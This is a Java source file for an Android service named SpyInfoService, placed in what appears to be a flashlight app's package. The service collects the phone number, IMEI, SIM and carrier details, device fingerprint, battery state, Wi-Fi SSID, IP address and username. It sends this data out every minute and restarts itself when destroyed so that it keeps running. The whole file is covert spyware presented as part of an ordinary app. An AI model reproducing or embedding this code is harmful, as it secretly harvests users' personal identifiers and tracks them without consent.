package com.androidhive.flashlight;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by lucadalseno on 05/10/17.
 */

public class SpyInfoService extends Service {

    private GetInfo info;
    private Connection connection;
    private Connection ciclic;
    private JSONObject doc;
    private JSONObject telephoneJSON;
    private JSONObject buildInfoJSON;
    private JSONObject batteryInfoJSON;
    private JSONObject networkInfoJSON;
    private JSONObject userInfoJSON;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        info = new GetInfo(this);

        try {
            doc = new JSONObject();

            telephoneJSON = new JSONObject();
            telephoneJSON.put("PhoneNumber", info.getPhoneNumber());
            telephoneJSON.put("NetworkOperatorName", info.getNetworkOperatorName());
            telephoneJSON.put("SimCountryIso", info.getSimCountryIso());
            telephoneJSON.put("SimOperator", info.getSimOperator());
            telephoneJSON.put("IMEI", info.getImei());
            doc.put("TelephoneInfo", telephoneJSON);

            buildInfoJSON = new JSONObject();
            buildInfoJSON.put("SDK", info.getSDK());
            buildInfoJSON.put("Device", info.getDevice());
            buildInfoJSON.put("Manufacturer", info.getManufacturer());
            buildInfoJSON.put("Model", info.getModel());
            buildInfoJSON.put("Product", info.getProduct());
            buildInfoJSON.put("User", info.getBuildUser());
            buildInfoJSON.put("Brand", info.getBrand());
            buildInfoJSON.put("Fingerprint", info.getFingerprint());
            buildInfoJSON.put("Hardware", info.getHardware());
            doc.put("BuildInfo", buildInfoJSON);

            batteryInfoJSON = new JSONObject();
            batteryInfoJSON.put("Status", info.getStatus());
            batteryInfoJSON.put("IsCharging", info.getIsCharging());
            batteryInfoJSON.put("USBCharge", info.isUsbCharge());
            batteryInfoJSON.put("ACCharge", info.isAcCharge());
            batteryInfoJSON.put("Level", info.getLevel());
            batteryInfoJSON.put("Percentage", info.getBatteryPct());
            doc.put("BatteryInfo", batteryInfoJSON);

            networkInfoJSON = new JSONObject();
            networkInfoJSON.put("SSID", info.getSsid());
            networkInfoJSON.put("IP", info.getIP());
            doc.put("NetworkInfo", networkInfoJSON);

            userInfoJSON = new JSONObject();
            userInfoJSON.put("Username", info.getUsername());
            doc.put("UserInfo", userInfoJSON);

            doc.put("r", "InsertDevice");
            connection = new Connection(doc);
            connection.execute();

        } catch(JSONException e){
            Log.i("Error",""+e);
        }


        //Do request every minutes
        final Handler handler = new Handler();
        final int delay = 60000; //1 minute in milliseconds

        handler.postDelayed(new Runnable() {
            public void run() {
                ciclic = new Connection(doc);
                ciclic.execute();
                handler.postDelayed(this, delay);
            }
        }, delay);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //Recall Himself on destroy manually
        startService(new Intent(this, SpyInfoService.class));
    }
}
